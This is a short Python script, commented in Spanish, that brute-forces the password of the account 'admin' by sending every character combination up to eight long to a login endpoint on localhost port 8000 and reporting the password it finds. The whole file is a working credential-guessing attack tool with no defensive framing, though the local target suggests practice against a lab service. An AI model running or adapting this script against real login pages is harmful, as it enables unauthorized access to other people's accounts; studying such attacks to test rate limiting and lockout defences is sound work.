import time
import itertools
import requests

letras_min = "abcdefghijklmnopqrstuvwxyz"
letras_may = "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
caracteres_especiales = "!@#(){}[]*=+´'-_.,;><"
digitos = "1234567890"
conjunto_total = letras_min + letras_may + caracteres_especiales + digitos

objetivo = "admin"

contador = 0
tiempo_inicio = time.time()
clave_hallada = ""
exito = False

for tam in range(1, 9):
    if exito:
        break
    for combinacion in itertools.product(conjunto_total, repeat=tam):
        contador += 1
        candidato = "".join(combinacion)

        respuesta = requests.post(
            "http://127.0.0.1:8000/login",
            json={"username": objetivo, "password": candidato}
        )
        datos = respuesta.json()

        if datos["success"] == True:
            clave_hallada = candidato
            exito = True
            break
        else:
            print(f"[{contador}] Intento fallido: {candidato}")

tiempo_final = time.time() - tiempo_inicio

print(f"Usuario objetivo: {objetivo}")
print(f"Contraseña encontrada: {clave_hallada}")
print(f"Total de intentos: {contador}")
print(f"Tiempo total: {tiempo_final:.3f}s")